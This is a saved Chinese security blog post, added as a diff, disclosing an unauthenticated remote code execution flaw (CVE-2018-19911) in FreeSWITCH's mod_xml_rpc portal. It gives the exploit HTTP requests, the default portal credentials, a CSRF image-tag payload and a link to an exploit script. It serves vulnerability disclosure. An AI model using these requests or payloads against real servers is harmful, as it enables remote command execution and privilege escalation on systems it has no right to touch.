@@ -1,0 +1,303 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>FREESWITCH 远程代码执行漏洞（CVE-2018-19911） - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="freeswitchFreeSWITCH的是一个跨平台的开源电话交换平台，具有很强的伸缩性。旨在为音频、视频、文字或任何其他形式的媒体，提供路由和互连通信协议。它创建于2006年，填补了许多商业..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="FREESWITCH 远程代码执行漏洞（CVE-2018-19911） &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="http://b1ue.cn/feed/archives/42.html" />
+<link rel="alternate" type="application/rdf+xml" title="FREESWITCH 远程代码执行漏洞（CVE-2018-19911） &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="http://b1ue.cn/feed/rss/archives/42.html" />
+<link rel="alternate" type="application/atom+xml" title="FREESWITCH 远程代码执行漏洞（CVE-2018-19911） &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="http://b1ue.cn/feed/atom/archives/42.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-42'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-42'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-42'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _mJr = '32'//'fc'
++//'a'
+'d9'+'8'//'f3'
++//'c1j'
+'3'+'340'//'d4'
++//'mP'
+'mP'+'6'//'4z'
++//'hBm'
+'e9'+//'S'
+'b2'+''///*'ZnE'*/'ZnE'
++'09'//'UR'
++//'rW'
+'bfb'+//'kaq'
+'5c4'+//'fXp'
+'fXp'+'p'//'p'
++//'irs'
+'1b'+//'0w'
+'67e'+'1c'//'M'
++//'Kl'
+'0'+/* 'H'//'H' */''+'RtY'//'RtY'
++//'u'
+'c'+//'p'
+'p'+//'XJ'
+'2', _1HEz9Hj = [[9,11],[22,25],[22,23],[30,33],[31,32]];
+    
+    for (var i = 0; i < _1HEz9Hj.length; i ++) {
+        _mJr = _mJr.substring(0, _1HEz9Hj[i][0]) + _mJr.substring(_1HEz9Hj[i][1]);
+    }
+
+    return _mJr;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="http://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="http://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="http://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="http://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="http://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="http://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">FREESWITCH 远程代码执行漏洞（CVE-2018-19911）</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2018-12-15 12:39:00" itemprop="datePublished">2018-12-15 12:39:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="http://b1ue.cn/archives/42.html"><a href="http://b1ue.cn/category/safe/">安全</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="http://b1ue.cn/archives/42.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>freeswitch</h1><blockquote><p>FreeSWITCH的是一个跨平台的开源电话交换平台，具有很强的伸缩性。旨在为音频、视频、文字或任何其他形式的媒体，提供路由和互连通信协议。它创建于2006年，填补了许多商业解决方案的的空白。FreeSWITCH的也提供了一个稳定的电话平台，许多广泛使用的免费电话就是在使用它开发的</p></blockquote><h1>关于CVE-2018-19911</h1><p>这个漏洞首次被我发现是在挖某SRC漏洞扫描资产的时候发现的，8080端口暴露在了公网，没有认证过程。</p><p>通过banner得知他使用了freeswitch的VOIP服务，我安装了这个软件在本地测试，并且通过官网查询了一些文档。</p><p>其中有敏感操作的功能包括：系统命令执行、lua脚本、数据库操作、文件探测等...</p><p>影响版本:&lt;=1.8.2</p><p>漏洞模块:mod_xml_rpc</p><p>我总共测试了三个版本（各版本下载地址<a href="http://files.freeswitch.org/" target="_blank">http://files.freeswitch.org/</a>）</p><ul><li>1.8.2</li><li>1.5.15</li><li>1.7.0</li></ul><h1>1.5.15</h1><p>安装freeswitch1.5.15 Windows版本（<a href="http://files.freeswitch.org/windows/installer/x64/freeswitch.msi" target="_blank">http://files.freeswitch.org/windows/installer/x64/freeswitch.msi</a>）</p><p>打开控制台，输入：load mod_xml_rpc（加载freeswitch portal）</p><p>访问本地8080端口，</p><p>打开<a href="http://127.0.0.1" target="_blank">http://127.0.0.1</a>:8080/portal/index.html </p><p>在控制台输入<br><code> api(&quot;system calc&quot;) </code><br>或<br><code> api(&quot;bg_system calc&quot;) </code></p><p><img src="/usr/uploads/2018/12/2114795481.png" alt="1.png" title="1.png"></p><p>也可以直接请求接口</p><p><a href="http://127.0.0.1" target="_blank">http://127.0.0.1</a>:8080/txtapi/system?calc<br>或<br><a href="http://127.0.0.1" target="_blank">http://127.0.0.1</a>:8080/api/system?calc</p><p><img src="/usr/uploads/2018/12/4260578820.png" alt="2.png" title="2.png"></p><h1>1.7.0</h1><p><img src="/usr/uploads/2018/12/2599872475.png" alt="3.png" title="3.png"><br><img src="/usr/uploads/2018/12/2833369584.png" alt="4.png" title="4.png"></p><h1>EXP</h1><p>exp相关的东西都放到github上了</p><p>传送门：<a href="https://github.com/iSafeBlue/freeswitch_rce" target="_blank">https://github.com/iSafeBlue/freeswitch_rce</a></p><p>freeswitch portal的默认账号密码是freeswitch:works</p><p>你可以使用<code>freeswitch_rce.py</code>自行检测。</p><p>或者使用csrf的方式向已登录的管理员发起攻击。</p><pre><code>&lt;img src=&quot;http://127.0.0.1:8080/api/system?calc&quot;&gt;</code></pre><p>因为freeswitch在运行时通常是以高权限运行的，所以这个漏洞也可以用于提权。</p><p><img src="/usr/uploads/2018/12/3035347706.png" alt="5.png" title="5.png"></p>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-42" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="http://b1ue.cn/archives/42.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="http://b1ue.cn/archives/42.html#respond-post-42" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
